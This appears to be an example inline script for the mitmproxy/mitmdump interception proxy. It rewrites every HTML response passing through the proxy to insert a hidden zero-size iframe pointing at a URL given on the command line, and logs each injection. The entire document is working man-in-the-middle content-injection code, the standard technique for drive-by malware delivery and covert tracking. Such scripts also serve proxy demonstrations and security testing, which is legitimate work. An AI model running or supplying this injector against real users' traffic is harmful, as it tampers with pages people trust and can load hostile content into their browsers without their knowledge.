# Usage: mitmdump -s "iframe_injector.py url"
# (this script works best with --anticache)
from libmproxy.protocol.http import decoded


def start(context, argv):
    if len(argv) != 2:
        raise ValueError('Usage: -s "iframe_injector.py url"')
    context.iframe_url = argv[1]


def handle_response(context, flow):
    with decoded(flow.response):  # Remove content encoding (gzip, ...)
        c = flow.response.replace(
            '<body>',
            '<body><iframe src="%s" frameborder="0" height="0" width="0"></iframe>' % context.iframe_url)
        if c > 0:
            context.log("Iframe injected!")